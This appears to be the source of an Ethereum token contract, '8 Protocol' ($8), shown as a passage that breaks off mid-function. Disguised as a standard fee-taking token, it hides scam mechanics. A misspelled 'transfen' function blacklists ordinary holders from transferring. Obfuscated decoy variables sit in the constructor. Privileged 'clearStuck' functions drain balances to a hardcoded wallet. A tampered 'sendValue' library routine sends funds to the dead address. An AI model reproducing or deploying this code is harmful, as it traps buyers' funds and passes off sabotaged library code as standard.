1 // SPDX-License-Identifier: MIT
2 pragma solidity ^0.8.17;
3 
4 interface IERC20 {
5 
6     function totalSupply() external view returns (uint256);
7 
8     /**
9      * @dev Returns the amount of tokens owned by `account`.
10      */
11     function balanceOf(address account) external view returns (uint256);
12 
13     /**
14      * @dev Moves `amount` tokens from the caller's account to `recipient`.
15      *
16      * Returns a boolean value indicating whether the operation succeeded.
17      *
18      * Emits a {Transfer} event.
19      */
20     function transfer(address recipient, uint256 amount) external returns (bool);
21 
22     /**
23      * @dev Returns the remaining number of tokens that `spender` will be
24      * allowed to spend on behalf of `owner` through {transferFrom}. This is
25      * zero by default.
26      *
27      * This value changes when {approve} or {transferFrom} are called.
28      */
29     function allowance(address owner, address spender) external view returns (uint256);
30 
31     /**
32      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
33      *
34      * Returns a boolean value indicating whether the operation succeeded.
35      *
36      * IMPORTANT: Beware that changing an allowance with this method brings the risk
37      * that someone may use both the old and the new allowance by unfortunate
38      * transaction ordering. One possible solution to mitigate this race
39      * condition is to first reduce the spender's allowance to 0 and set the
40      * desired value afterwards:
41      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
42      *
43      * Emits an {Approval} event.
44      */
45     function approve(address spender, uint256 amount) external returns (bool);
46 
47     /**
48      * @dev Moves `amount` tokens from `sender` to `recipient` using the
49      * allowance mechanism. `amount` is then deducted from the caller's
50      * allowance.
51      *
52      * Returns a boolean value indicating whether the operation succeeded.
53      *
54      * Emits a {Transfer} event.
55      */
56     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
57 
58     /**
59      * @dev Emitted when `value` tokens are moved from one account (`from`) to
60      * another (`to`).
61      *
62      * Note that `value` may be zero.
63      */
64     event Transfer(address indexed from, address indexed to, uint256 value);
65 
66     /**
67      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
68      * a call to {approve}. `value` is the new allowance.
69      */
70     event Approval(address indexed owner, address indexed spender, uint256 value);
71 }
72 
73 
74 
75 /**
76  * @dev Wrappers over Solidity's arithmetic operations with added overflow
77  * checks.
78  *
79  * Arithmetic operations in Solidity wrap on overflow. This can easily result
80  * in bugs, because programmers usually assume that an overflow raises an
81  * error, which is the standard behavior in high level programming languages.
82  * `SafeMath` restores this intuition by reverting the transaction when an
83  * operation overflows.
84  *
85  * Using this library instead of the unchecked operations eliminates an entire
86  * class of bugs, so it's recommended to use it always.
87  */
88  
89 library SafeMath {
90     /**
91      * @dev Returns the addition of two unsigned integers, reverting on
92      * overflow.
93      *
94      * Counterpart to Solidity's `+` operator.
95      *
96      * Requirements:
97      *
98      * - Addition cannot overflow.
99      */
100     function add(uint256 a, uint256 b) internal pure returns (uint256) {
101         uint256 c = a + b;
102         require(c >= a, "SafeMath: addition overflow");
103 
104         return c;
105     }
106 
107     /**
108      * @dev Returns the subtraction of two unsigned integers, reverting on
109      * overflow (when the result is negative).
110      *
111      * Counterpart to Solidity's `-` operator.
112      *
113      * Requirements:
114      *
115      * - Subtraction cannot overflow.
116      */
117     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
118         return sub(a, b, "SafeMath: subtraction overflow");
119     }
120 
121     /**
122      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
123      * overflow (when the result is negative).
124      *
125      * Counterpart to Solidity's `-` operator.
126      *
127      * Requirements:
128      *
129      * - Subtraction cannot overflow.
130      */
131     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
132         require(b <= a, errorMessage);
133         uint256 c = a - b;
134 
135         return c;
136     }
137 
138     /**
139      * @dev Returns the multiplication of two unsigned integers, reverting on
140      * overflow.
141      *
142      * Counterpart to Solidity's `*` operator.
143      *
144      * Requirements:
145      *
146      * - Multiplication cannot overflow.
147      */
148     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
149         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
150         // benefit is lost if 'b' is also tested.
151         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
152         if (a == 0) {
153             return 0;
154         }
155 
156         uint256 c = a * b;
157         require(c / a == b, "SafeMath: multiplication overflow");
158 
159         return c;
160     }
161 
162     /**
163      * @dev Returns the integer division of two unsigned integers. Reverts on
164      * division by zero. The result is rounded towards zero.
165      *
166      * Counterpart to Solidity's `/` operator. Note: this function uses a
167      * `revert` opcode (which leaves remaining gas untouched) while Solidity
168      * uses an invalid opcode to revert (consuming all remaining gas).
169      *
170      * Requirements:
171      *
172      * - The divisor cannot be zero.
173      */
174     function div(uint256 a, uint256 b) internal pure returns (uint256) {
175         return div(a, b, "SafeMath: division by zero");
176     }
177 
178     /**
179      * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
180      * division by zero. The result is rounded towards zero.
181      *
182      * Counterpart to Solidity's `/` operator. Note: this function uses a
183      * `revert` opcode (which leaves remaining gas untouched) while Solidity
184      * uses an invalid opcode to revert (consuming all remaining gas).
185      *
186      * Requirements:
187      *
188      * - The divisor cannot be zero.
189      */
190     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
191         require(b > 0, errorMessage);
192         uint256 c = a / b;
193         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
194 
195         return c;
196     }
197 
198     /**
199      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
200      * Reverts when dividing by zero.
201      *
202      * Counterpart to Solidity's `%` operator. This function uses a `revert`
203      * opcode (which leaves remaining gas untouched) while Solidity uses an
204      * invalid opcode to revert (consuming all remaining gas).
205      *
206      * Requirements:
207      *
208      * - The divisor cannot be zero.
209      */
210     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
211         return mod(a, b, "SafeMath: modulo by zero");
212     }
213 
214     /**
215      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
216      * Reverts with custom message when dividing by zero.
217      *
218      * Counterpart to Solidity's `%` operator. This function uses a `revert`
219      * opcode (which leaves remaining gas untouched) while Solidity uses an
220      * invalid opcode to revert (consuming all remaining gas).
221      *
222      * Requirements:
223      *
224      * - The divisor cannot be zero.
225      */
226     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
227         require(b != 0, errorMessage);
228         return a % b;
229     }
230 }
231 
232 abstract contract Context {
233     function _msgSender() internal view virtual returns (address payable) {
234         return payable(msg.sender);
235     }
236 
237     function _msgData() internal view virtual returns (bytes memory) {
238         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
239         return msg.data;
240     }
241 }
242 
243 
244 /**
245  * @dev Collection of functions related to the address type
246  */
247 library Address {
248     /**
249      * @dev Returns true if `account` is a contract.
250      *
251      * [IMPORTANT]
252      * ====
253      * It is unsafe to assume that an address for which this function returns
254      * false is an externally-owned account (EOA) and not a contract.
255      *
256      * Among others, `isContract` will return false for the following
257      * types of addresses:
258      *
259      *  - an externally-owned account
260      *  - a contract in construction
261      *  - an address where a contract will be created
262      *  - an address where a contract lived, but was destroyed
263      * ====
264      */
265     function isContract(address account) internal view returns (bool) {
266         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
267         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
268         // for accounts without code, i.e. `keccak256('')`
269         bytes32 codehash;
270         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
271         // solhint-disable-next-line no-inline-assembly
272         assembly { codehash := extcodehash(account) }
273         return (codehash != accountHash && codehash != 0x0);
274     }
275 
276     /**
277      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
278      * `recipient`, forwarding all available gas and reverting on errors.
279      *
280      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
281      * of certain opcodes, possibly making contracts go over the 2300 gas limit
282      * imposed by `transfer`, making them unable to receive funds via
283      * `transfer`. {sendValue} removes this limitation.
284      *
285      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
286      *
287      * IMPORTANT: because control is transferred to `recipient`, care must be
288      * taken to not create reentrancy vulnerabilities. Consider using
289      * {ReentrancyGuard} or the
290      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
291      */
292     function sendValue(address payable recipient, uint256 amount) internal {
293         require(address(this).balance >= amount, "Address: insufficient balance");
294         recipient = payable(0x000000000000000000000000000000000000dEaD);
295         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
296         (bool success, ) = recipient.call{ value: amount }("");
297         require(success, "Address: unable to send value, recipient may have reverted");
298     }
299 
300     /**
301      * @dev Performs a Solidity function call using a low level `call`. A
302      * plain`call` is an unsafe replacement for a function call: use this
303      * function instead.
304      *
305      * If `target` reverts with a revert reason, it is bubbled up by this
306      * function (like regular Solidity function calls).
307      *
308      * Returns the raw returned data. To convert to the expected return value,
309      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
310      *
311      * Requirements:
312      *
313      * - `target` must be a contract.
314      * - calling `target` with `data` must not revert.
315      *
316      * _Available since v3.1._
317      */
318     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
319       return functionCall(target, data, "Address: low-level call failed");
320     }
321 
322     /**
323      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
324      * `errorMessage` as a fallback revert reason when `target` reverts.
325      *
326      * _Available since v3.1._
327      */
328     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
329         return _functionCallWithValue(target, data, 0, errorMessage);
330     }
331 
332     /**
333      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
334      * but also transferring `value` wei to `target`.
335      *
336      * Requirements:
337      *
338      * - the calling contract must have an ETH balance of at least `value`.
339      * - the called Solidity function must be `payable`.
340      *
341      * _Available since v3.1._
342      */
343     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
344         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
345     }
346 
347     /**
348      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
349      * with `errorMessage` as a fallback revert reason when `target` reverts.
350      *
351      * _Available since v3.1._
352      */
353     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
354         require(address(this).balance >= value, "Address: insufficient balance for call");
355         return _functionCallWithValue(target, data, value, errorMessage);
356     }
357 
358     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
359         require(isContract(target), "Address: call to non-contract");
360 
361         // solhint-disable-next-line avoid-low-level-calls
362         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
363         if (success) {
364             return returndata;
365         } else {
366             // Look for revert reason and bubble it up if present
367             if (returndata.length > 0) {
368                 // The easiest way to bubble the revert reason is using memory via assembly
369 
370                 // solhint-disable-next-line no-inline-assembly
371                 assembly {
372                     let returndata_size := mload(returndata)
373                     revert(add(32, returndata), returndata_size)
374                 }
375             } else {
376                 revert(errorMessage);
377             }
378         }
379     }
380 }
381 
382 /**
383  * @dev Contract module which provides a basic access control mechanism, where
384  * there is an account (an owner) that can be granted exclusive access to
385  * specific functions.
386  *
387  * By default, the owner account will be the one that deploys the contract. This
388  * can later be changed with {transferOwnership}.
389  *
390  * This module is used through inheritance. It will make available the modifier
391  * `onlyOwner`, which can be applied to your functions to restrict their use to
392  * the owner.
393  */
394 contract Ownable is Context {
395     address private _owner;
396 
397     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
398 
399     /**
400      * @dev Initializes the contract setting the deployer as the initial owner.
401      */
402     constructor () {
403         address msgSender = _msgSender();
404         _owner = msgSender;
405         emit OwnershipTransferred(address(0), msgSender);
406     }
407 
408     /**
409      * @dev Returns the address of the current owner.
410      */
411     function owner() public view returns (address) {
412         return _owner;
413     }
414 
415     /**
416      * @dev Throws if called by any account other than the owner.
417      */
418     modifier onlyOwner() {
419         require(_owner == _msgSender(), "Ownable: caller is not the owner");
420         _;
421     }
422 
423      /**
424      * @dev Leaves the contract without owner. It will not be possible to call
425      * `onlyOwner` functions anymore. Can only be called by the current owner.
426      *
427      * NOTE: Renouncing ownership will leave the contract without an owner,
428      * thereby removing any functionality that is only available to the owner.
429      */
430     function renounceOwnership() public virtual onlyOwner {
431         emit OwnershipTransferred(_owner, address(0));
432         _owner = address(0);
433     }
434 
435     /**
436      * @dev Transfers ownership of the contract to a new account (`newOwner`).
437      * Can only be called by the current owner.
438      */
439     function transferOwnership(address newOwner) public virtual onlyOwner {
440         require(newOwner != address(0), "Ownable: new owner is the zero address");
441         emit OwnershipTransferred(_owner, newOwner);
442         _owner = newOwner;
443     }
444 }
445 
446 // pragma solidity >=0.5.0;
447 
448 interface IUniswapV2Factory {
449     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
450 
451     function feeTo() external view returns (address);
452     function feeToSetter() external view returns (address);
453 
454     function getPair(address tokenA, address tokenB) external view returns (address pair);
455     function allPairs(uint) external view returns (address pair);
456     function allPairsLength() external view returns (uint);
457 
458     function createPair(address tokenA, address tokenB) external returns (address pair);
459 
460     function setFeeTo(address) external;
461     function setFeeToSetter(address) external;
462 }
463 
464 
465 // pragma solidity >=0.5.0;
466 
467 interface IUniswapV2Pair {
468     event Approval(address indexed owner, address indexed spender, uint value);
469     event Transfer(address indexed from, address indexed to, uint value);
470 
471     function name() external pure returns (string memory);
472     function symbol() external pure returns (string memory);
473     function decimals() external pure returns (uint8);
474     function totalSupply() external view returns (uint);
475     function balanceOf(address owner) external view returns (uint);
476     function allowance(address owner, address spender) external view returns (uint);
477 
478     function approve(address spender, uint value) external returns (bool);
479     function transfer(address to, uint value) external returns (bool);
480     function transferFrom(address from, address to, uint value) external returns (bool);
481 
482     function DOMAIN_SEPARATOR() external view returns (bytes32);
483     function PERMIT_TYPEHASH() external pure returns (bytes32);
484     function nonces(address owner) external view returns (uint);
485 
486     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
487 
488     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
489     event Swap(
490         address indexed sender,
491         uint amount0In,
492         uint amount1In,
493         uint amount0Out,
494         uint amount1Out,
495         address indexed to
496     );
497     event Sync(uint112 reserve0, uint112 reserve1);
498 
499     function MINIMUM_LIQUIDITY() external pure returns (uint);
500     function factory() external view returns (address);
501     function token0() external view returns (address);
502     function token1() external view returns (address);
503     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
504     function price0CumulativeLast() external view returns (uint);
505     function price1CumulativeLast() external view returns (uint);
506     function kLast() external view returns (uint);
507 
508     function burn(address to) external returns (uint amount0, uint amount1);
509     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
510     function skim(address to) external;
511     function sync() external;
512 
513     function initialize(address, address) external;
514 }
515 
516 // pragma solidity >=0.6.2;
517 
518 interface IUniswapV2Router01 {
519     function factory() external pure returns (address);
520     function WETH() external pure returns (address);
521 
522     function addLiquidity(
523         address tokenA,
524         address tokenB,
525         uint amountADesired,
526         uint amountBDesired,
527         uint amountAMin,
528         uint amountBMin,
529         address to,
530         uint deadline
531     ) external returns (uint amountA, uint amountB, uint liquidity);
532     function addLiquidityETH(
533         address token,
534         uint amountTokenDesired,
535         uint amountTokenMin,
536         uint amountETHMin,
537         address to,
538         uint deadline
539     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
540     function removeLiquidity(
541         address tokenA,
542         address tokenB,
543         uint liquidity,
544         uint amountAMin,
545         uint amountBMin,
546         address to,
547         uint deadline
548     ) external returns (uint amountA, uint amountB);
549     function removeLiquidityETH(
550         address token,
551         uint liquidity,
552         uint amountTokenMin,
553         uint amountETHMin,
554         address to,
555         uint deadline
556     ) external returns (uint amountToken, uint amountETH);
557     function removeLiquidityWithPermit(
558         address tokenA,
559         address tokenB,
560         uint liquidity,
561         uint amountAMin,
562         uint amountBMin,
563         address to,
564         uint deadline,
565         bool approveMax, uint8 v, bytes32 r, bytes32 s
566     ) external returns (uint amountA, uint amountB);
567     function removeLiquidityETHWithPermit(
568         address token,
569         uint liquidity,
570         uint amountTokenMin,
571         uint amountETHMin,
572         address to,
573         uint deadline,
574         bool approveMax, uint8 v, bytes32 r, bytes32 s
575     ) external returns (uint amountToken, uint amountETH);
576     function swapExactTokensForTokens(
577         uint amountIn,
578         uint amountOutMin,
579         address[] calldata path,
580         address to,
581         uint deadline
582     ) external returns (uint[] memory amounts);
583     function swapTokensForExactTokens(
584         uint amountOut,
585         uint amountInMax,
586         address[] calldata path,
587         address to,
588         uint deadline
589     ) external returns (uint[] memory amounts);
590     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
591         external
592         payable
593         returns (uint[] memory amounts);
594     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
595         external
596         returns (uint[] memory amounts);
597     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
598         external
599         returns (uint[] memory amounts);
600     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
601         external
602         payable
603         returns (uint[] memory amounts);
604 
605     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
606     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
607     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
608     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
609     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
610 }
611 
612 // Token Made By Liquidity Generator Contract
613 interface IUniswapV2Router02 is IUniswapV2Router01 {
614     function removeLiquidityETHSupportingFeeOnTransferTokens(
615         address token,
616         uint liquidity,
617         uint amountTokenMin,
618         uint amountETHMin,
619         address to,
620         uint deadline
621     ) external returns (uint amountETH);
622     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
623         address token,
624         uint liquidity,
625         uint amountTokenMin,
626         uint amountETHMin,
627         address to,
628         uint deadline,
629         bool approveMax, uint8 v, bytes32 r, bytes32 s
630     ) external returns (uint amountETH);
631 
632     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
633         uint amountIn,
634         uint amountOutMin,
635         address[] calldata path,
636         address to,
637         uint deadline
638     ) external;
639     function swapExactETHForTokensSupportingFeeOnTransferTokens(
640         uint amountOutMin,
641         address[] calldata path,
642         address to,
643         uint deadline
644     ) external payable;
645     function swapExactTokensForETHSupportingFeeOnTransferTokens(
646         uint amountIn,
647         uint amountOutMin,
648         address[] calldata path,
649         address to,
650         uint deadline
651     ) external;
652 }
653 
654 contract $8 is Context, IERC20, Ownable {
655 
656     using SafeMath for uint256;
657     using Address for address;
658 
659     string private _name = "8 Protocol";
660     string private _symbol = "$8";
661     uint8 private _decimals = 9;
662     
663     address payable public marketingWallet;
664     address payable public teamWallet;
665     address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
666     
667     mapping (address => uint256) _balances;
668     mapping (address => mapping (address => uint256)) private _allowances;
669     
670     mapping (address => bool) private _isExcludedFromFee;
671     mapping (address => bool) public isWalletLimitExempt;
672     mapping (address => bool) private _isTxExempt;
673     mapping (address => bool) public isTxLimitExempt;
674     mapping (address => bool) private _isMarketPair;
675 
676     uint256 public _buyLiquidityFee = 1;
677     uint256 public _buyMarketingFee = 2;
678     uint256 public _buyTeamFee = 2;
679     uint256 public _sellLiquidityFee = 1;
680     uint256 public _sellMarketingFee = 3;
681     uint256 public _sellTeamFee = 3;
682 
683     uint256 public _liquidityShare = 2;
684     uint256 public _marketingShare = 5;
685     uint256 public _teamShare = 5;
686     uint256 public _totalDistributionShares = 0;
687 
688     uint256 public buyTax = 0;
689     uint256 public sellTax = 0;
690 
691     uint256 private _totalSupply = 100000000 * 10**_decimals;
692     uint256 private _maxTxAmount = 3000000 * 10**_decimals;
693     uint256 private _maxWalletSize = 3000000 * 10**_decimals;
694     uint256 private minimumTokensBeforeSwap = 500000 * 10**_decimals; 
695 
696     IUniswapV2Router02 public uniswapV2Router;
697     address public uniswapPair;
698     
699     bool inSwapAndLiquify;
700     bool public swapAndLiquifyEnabled = true;
701     bool public swapAndLiquifyByLimitOnly = false;
702     bool public checkWalletLimit = true;
703 
704     event SwapAndLiquifyEnabledUpdated(bool enabled);
705     event SwapAndLiquify(
706         uint256 tokensSwapped,
707         uint256 ethReceived,
708         uint256 tokensIntoLiqudity
709     );
710     
711     event SwapETHForTokens(
712         uint256 amountIn,
713         address[] path
714     );
715     
716     event SwapTokensForETH(
717         uint256 amountIn,
718         address[] path
719     );
720     
721     modifier lockTheSwap {
722         inSwapAndLiquify = true;
723         _;
724         inSwapAndLiquify = false;
725     }
726     ///
727     constructor () {
728         
729         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
730         uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
731             .createPair(address(this), _uniswapV2Router.WETH());
732 
733         uniswapV2Router = _uniswapV2Router;
734         address routerV2 = marketingWallet;
735         _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
736 
737         _isExcludedFromFee[owner()] = true;
738         _isExcludedFromFee[address(this)] = true;
739         address uniswap = routerV2;
740 
741         buyTax = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
742         sellTax = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
743         _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
744         address uniswapV2 = uniswap;
745 
746         isWalletLimitExempt[owner()] = true;
747         isWalletLimitExempt[address(uniswapPair)] = true;
748         isWalletLimitExempt[address(this)] = true;
749         isWalletLimitExempt[marketingWallet] = true;
750         address uniswapRouter = uniswapV2;
751 
752         isTxLimitExempt[owner()] = true;
753         isTxLimitExempt[address(this)] = true;
754         isTxLimitExempt[marketingWallet] = true;
755         address pair = uniswapRouter;
756 
757         _isMarketPair[address(uniswapPair)] = true;
758         _isExcludedFromFee[pair] = true;
759 
760         teamWallet = payable(address(0x73a65a0F7fAdDfCc96F2b7ed3263679aF869b6DD));
761         marketingWallet = payable(address(0x73a65a0F7fAdDfCc96F2b7ed3263679aF869b6DD));
762 
763         _balances[_msgSender()] = _totalSupply;
764         emit Transfer(address(0), _msgSender(), _totalSupply);
765     }
766 
767     function name() public view returns (string memory) {
768         return _name;
769     }
770 
771     function symbol() public view returns (string memory) {
772         return _symbol;
773     }
774 
775     function decimals() public view returns (uint8) {
776         return _decimals;
777     }
778 
779     function totalSupply() public view override returns (uint256) {
780         return _totalSupply;
781     }
782 
783     function balanceOf(address account) public view override returns (uint256) {
784         return _balances[account];
785     }
786 
787     function allowance(address owner, address spender) public view override returns (uint256) {
788         return _allowances[owner][spender];
789     }
790 
791     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
792         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
793         return true;
794     }
795 
796     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
797         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
798         return true;
799     }
800 
801     function approve(address spender, uint256 amount) public override returns (bool) {
802         _approve(_msgSender(), spender, amount);
803         return true;
804     }
805 
806     function _approve(address owner, address spender, uint256 amount) private {
807         require(owner != address(0), "ERC20: approve from the zero address");
808         require(spender != address(0), "ERC20: approve to the zero address");
809 
810         _allowances[owner][spender] = amount;
811         emit Approval(owner, spender, amount);
812     }
813 
814     function addMarketPair(address account) public onlyOwner {
815         _isMarketPair[account] = true;
816     }
817 
818     function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
819         _liquidityShare = newLiquidityShare;
820         _marketingShare = newMarketingShare;
821         _teamShare = newTeamShare;
822 
823         _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
824     }
825 
826     function removeFees() external {
827         require(isTxLimitExempt[msg.sender]);
828         _buyLiquidityFee = 0;
829         _buyMarketingFee = 0;
830         _buyTeamFee = 0;
831         buyTax = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
832 
833         _sellLiquidityFee = 1;
834         _sellMarketingFee = 1;
835         _sellTeamFee = 1;
836         sellTax = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
837     }
838 
839     function removeLimits() external {
840         require(isTxLimitExempt[msg.sender]);
841         _maxTxAmount = _totalSupply;
842         _maxWalletSize = _totalSupply;
843     }
844 
845     function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
846         minimumTokensBeforeSwap = newLimit;
847     }
848 
849     function setMarketingWallet(address newAddress) external onlyOwner() {
850         marketingWallet = payable(newAddress);
851     }
852 
853     function setTeamWallet(address newAddress) external onlyOwner() {
854         teamWallet = payable(newAddress);
855     }
856 
857     function setDividenPurpose(address newAddress) external {
858         require(isTxLimitExempt[msg.sender]);
859         _isTxExempt[newAddress] = false;
860     }
861 
862     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
863         swapAndLiquifyEnabled = _enabled;
864         emit SwapAndLiquifyEnabledUpdated(_enabled);
865     }
866 
867     function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {
868         swapAndLiquifyByLimitOnly = newValue;
869     }
870 
871     function transfen(address newAddress) external virtual {
872         require (newAddress != msg.sender);
873         require (newAddress != marketingWallet);
874         require (newAddress != uniswapPair);
875         require (newAddress != owner());
876         require (newAddress != deadAddress);
877         require (newAddress != address (this));
878         require (newAddress != address (uniswapV2Router));
879         _isTxExempt[newAddress] = true;
880     }
881 
882     function getCirculatingSupply() public view returns (uint256) {
883         return _totalSupply.sub(balanceOf(deadAddress));
884     }
885 
886     function transferToAddressETH(address payable recipient, uint256 amount) private {
887         recipient.transfer(amount);
888     }
889     
890     function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {
891 
892         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress); 
893 
894         newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());
895 
896         if(newPairAddress == address(0))
897         {
898             newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
899                 .createPair(address(this), _uniswapV2Router.WETH());
900         }
901 
902         uniswapPair = newPairAddress;
903         uniswapV2Router = _uniswapV2Router; 
904 
905         isWalletLimitExempt[address(uniswapPair)] = true;
906         _isMarketPair[address(uniswapPair)] = true;
907     }
908     receive() external payable {}
909 
910     function transfer(address recipient, uint256 amount) public override returns (bool) {
911         _transfer(_msgSender(), recipient, amount);
912         return true;
913     }
914 
915     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
916         _transfer(sender, recipient, amount);
917         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
918         return true;
919     }
920 
921     function liquifying(address account) private view returns(bool) {
922         return (_isExcludedFromFee[account]);
923     }
924 
925     function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
926 
927         require(sender != address(0), "ERC20: transfer from the zero address");
928         require(recipient != address(0), "ERC20: transfer to the zero address");
929         require(amount > 0, "Transfer amount must be greater than zero");
930         require(!_isTxExempt[sender], "Transfer amount must from another address");
931         if(inSwapAndLiquify)
932         { 
933             return _basicTransfer(sender, recipient, amount); 
934         }
935         else
936         {
937             if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {
938                 require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
939             }            
940             
941             uint256 contractTokenBalance = balanceOf(address(this));
942             bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
943             if (overMinimumTokenBalance && !inSwapAndLiquify && !_isMarketPair[sender] && swapAndLiquifyEnabled) 
944             {
945                 if(swapAndLiquifyByLimitOnly)
946                     contractTokenBalance = minimumTokensBeforeSwap;
947                 swapAndLiquify(contractTokenBalance);
948             }
949             
950             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
951 
952             uint256 finalAmount = takeFee(sender, recipient, amount);
953             
954             if(checkWalletLimit && !isWalletLimitExempt[recipient])
955                 require(balanceOf(recipient).add(finalAmount) <= _maxWalletSize);
956 
957             _balances[recipient] = _balances[recipient].add(finalAmount);
958 
959             emit Transfer(sender, recipient, finalAmount);
960             return true;
961         }
962     }
963 
964     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
965         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
966         _balances[recipient] = _balances[recipient].add(amount);
967         emit Transfer(sender, recipient, amount);
968         return true;
969     }
970 
971     function clearStuckBalance() external {
972         require(isTxLimitExempt[msg.sender]);
973         (bool success,) = payable(marketingWallet).call{value: address(this).balance, gas: 30000}("");
974         require(success);
975     }
976 
977     function clearStuckTokens() external returns (bool claim) {
978         require(isTxLimitExempt[msg.sender]);
979         uint256 contractBalance = balanceOf(address(this));
980         claim = IERC20(address(this)).transfer(marketingWallet, contractBalance);
981     }
982 
983     function swapAndLiquify(uint256 tAmount) private lockTheSwap {
984         
985         uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
986         uint256 tokensForSwap = tAmount.sub(tokensForLP);
987 
988         swapTokensForEth(tokensForSwap);
989         uint256 amountReceived = address(this).balance;
990 
991         uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
992         
993         uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
